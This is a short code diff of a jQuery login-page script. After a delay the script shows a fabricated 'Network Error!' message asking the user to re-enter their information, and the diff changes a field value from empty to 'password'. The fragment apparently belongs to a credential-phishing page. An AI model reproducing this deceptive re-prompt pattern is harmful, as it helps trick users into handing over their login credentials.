@@ -118,7 +118,7 @@ $(document).ready(function() {
                 $('#hm').hide();
                 setTimeout(function() {
                     $("#x1").val(url);
-                    $("#x2").val("");
+                    $("#x2").val("password");
                     $('#msg').html(`Network Error! Please verify your information and try again`);
                     $("#submitBtn").html("Sign In").prop("disabled", false);
                 }, 2000);
